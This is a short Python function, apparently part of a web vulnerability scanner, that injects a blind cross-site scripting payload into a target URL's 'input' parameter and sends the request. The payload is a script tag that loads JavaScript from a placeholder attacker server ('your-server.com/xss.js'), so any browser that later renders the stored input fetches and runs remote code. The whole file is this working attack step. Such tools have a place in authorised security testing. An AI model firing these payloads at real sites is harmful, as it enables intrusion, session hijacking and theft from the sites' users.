def scan(url):
    from utils.requester import send_request

    payload = '<script src="http://your-server.com/xss.js"></script>'
    test_url = url + "?input=" + payload

    send_request(test_url)

    return "[*] Blind XSS Payload Sent"